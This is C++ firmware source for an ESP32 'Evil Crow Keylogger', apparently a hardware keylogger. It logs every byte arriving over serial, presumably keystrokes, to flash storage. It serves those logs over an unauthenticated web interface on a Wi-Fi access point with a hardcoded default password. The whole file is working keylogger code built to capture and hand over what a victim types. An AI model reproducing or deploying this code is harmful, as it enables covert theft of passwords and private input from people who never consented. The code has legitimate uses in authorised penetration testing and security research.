#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include "SPIFFS.h"
#include "index.h"
#include "viewlog.h"
#include "config.h"
#include "javascript.h"
#include "style.h"

// Config SSID, password and hostname
String defaultSSID = "Evil Crow Keylogger";
String defaultPassword = "123456789ECKeylogger";
String hostname = "evilcrow-keylogger";

// File
File logs;

// Web Server
String webString;
char local_IPstr[16];
const bool formatOnFail = true;
WebServer controlserver(80);

void enableWiFi() {
  String wifiSSID = defaultSSID;
  String wifiPassword = defaultPassword;

  if (readWiFiConfig(wifiSSID, wifiPassword)) {
    //Serial.println("Using saved Wi-Fi credentials.");
  } else {
    //Serial.println("Using default Wi-Fi credentials.");
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(wifiSSID.c_str(), wifiPassword.c_str());
}

void appendFile(fs::FS &fs, const char *path, const char *message, String messagestring) {
  logs = fs.open(path, FILE_APPEND);
  if (!logs) {
    // Serial.println("Failed to open file for appending");
    return;
  }

  if (logs.print(message) | logs.print(messagestring)) {
    // Serial.println("Message appended");
  } else {
    // Serial.println("Append failed");
  }

  logs.close();
}

void deleteFile(fs::FS &fs, const char * path){
  //Serial.printf("Deleting file: %s\n", path);
  if(fs.remove(path)){
    //Serial.println("File deleted");
  } else {
    //Serial.println("Delete failed");
  }
}

bool readWiFiConfig(String &ssid, String &password) {
  if (!SPIFFS.exists("/wifi_config.txt")) {
    //Serial.println("Wi-Fi config file not found");
    return false;
  }

  File file = SPIFFS.open("/wifi_config.txt", FILE_READ);
  if (!file) {
    //Serial.println("Failed to open Wi-Fi config file");
    return false;
  }

  ssid = file.readStringUntil('\n');
  ssid.trim();

  password = file.readStringUntil('\n');
  password.trim();

  file.close();

  if (ssid.length() == 0 || password.length() == 0) {
    //Serial.println("Invalid Wi-Fi config (empty fields)");
    return false;
  }

  //Serial.println("Wi-Fi config read successfully:");
  //Serial.print("SSID: "); Serial.println(ssid);
  //Serial.print("Password: "); Serial.println(password);
  return true;
}

void handleUpdateWiFi() {
  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
    String newSSID = controlserver.arg("ssid");
    String newPassword = controlserver.arg("password");

    if (SPIFFS.exists("/wifi_config.txt")) {
      SPIFFS.remove("/wifi_config.txt");
    }

    appendFile(SPIFFS, "/wifi_config.txt", newSSID.c_str(), "\n");
    appendFile(SPIFFS, "/wifi_config.txt", newPassword.c_str(), "\n");
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config applied successfully! Device will restart.\"}");
    delay(500);
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
  }
}

void handleDeleteWiFiConfig() {
  if (SPIFFS.exists("/wifi_config.txt")) {
    if (SPIFFS.remove("/wifi_config.txt")) {
      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config deleted successfully\"}");
      ESP.restart();
    } else {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete the file\"}");
    }
  } else {
    controlserver.send(404, "application/json", "{\"status\":\"error\",\"message\":\"Wi-Fi config file not found\"}");
  }
}

void handleStats() {
  size_t freeSpiffs = 0;

  if (SPIFFS.begin(true)) {
    freeSpiffs = SPIFFS.totalBytes() - SPIFFS.usedBytes();
  }

  String json = "{";
  json += "\"uptime\":" + String(millis() / 1000);
  json += ",\"cpu0\":" + String(getCpuFrequencyMhz());
  json += ",\"cpu1\":" + String(getXtalFrequencyMhz());
  json += ",\"temperature\":" + String(temperatureRead());
  json += ",\"freespiffs\":" + String(freeSpiffs);
  json += ",\"totalram\":" + String(ESP.getHeapSize());
  json += ",\"freeram\":" + String(ESP.getFreeHeap());
  json += "}";

  controlserver.send(200, "application/json", json);
}

void setup() {
  Serial.begin(38400);

  SPIFFS.begin(formatOnFail);

  delay(2000);

  enableWiFi();

  if (!MDNS.begin(hostname.c_str())) {
    //Serial.println("Error setting up MDNS responder!");
  }

  logs = SPIFFS.open("/logs.txt", "a+");

  controlserver.on("/", []() {
    controlserver.send(200, "text/html", Index);
  });

  controlserver.on("/viewlog", []() {
    controlserver.send(200, "text/html", ViewLog);
  });
  
  controlserver.on("/logs", [](){
    logs.close();
    String serverlog;
    serverlog += controlserver.arg(0);
    logs = SPIFFS.open("/logs.txt");
    webString = logs.readString();
    logs.close();
    logs = SPIFFS.open("/logs.txt", "a+");
    controlserver.send(200, "text/html", "View Log: "+serverlog +"\n-----\n"+webString);
    loop(); 
  });

  controlserver.on("/delete", []() {
    deleteFile(SPIFFS, "/logs.txt");
    controlserver.send(200, "application/json", "{\"status\":\"deleted\"}");
  });

  controlserver.on("/config", [](){
    controlserver.send(200, "text/html", Config);
  });

  controlserver.on("/updatewifi", handleUpdateWiFi);
  controlserver.on("/deletewificonfig", handleDeleteWiFiConfig);
  controlserver.on("/stats", handleStats);

  controlserver.on("/reboot", []() {
    controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Device rebooting\"}");
    delay(200);
    ESP.restart();
  });

  controlserver.on("/connectioncheck", []() {
    controlserver.send(200, "application/json", "{\"status\":\"ok\"}");
  });

  controlserver.on("/javascript.js", []() {
    controlserver.send(200, "text/javascript", Javascript);
  });

  controlserver.on("/style.css", []() {
    controlserver.send(200, "text/css", Style);
  });
  
  controlserver.begin();
}

void loop() {
  controlserver.handleClient();

  if(Serial.available()) {
    logs.write(Serial.read());
  }
}
